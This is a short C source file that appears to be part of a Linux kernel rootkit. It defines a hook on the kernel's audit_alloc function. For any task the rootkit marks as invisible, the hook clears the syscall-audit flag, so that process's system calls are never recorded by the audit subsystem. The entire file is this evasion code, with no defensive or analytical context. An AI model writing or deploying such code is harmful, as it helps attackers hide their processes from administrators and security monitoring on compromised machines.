#include "process.h"
#include <linux/audit.h>


int (*orig_audit_alloc)(struct task_struct *tsk);

static int rk_audit_alloc(struct task_struct *tsk)
{
	int err = 0;
	if (is_task_invisible(tsk)) {
		clear_task_syscall_work(tsk, SYSCALL_AUDIT);
	} else {
		err = orig_audit_alloc(tsk);
	}
	return err;
}
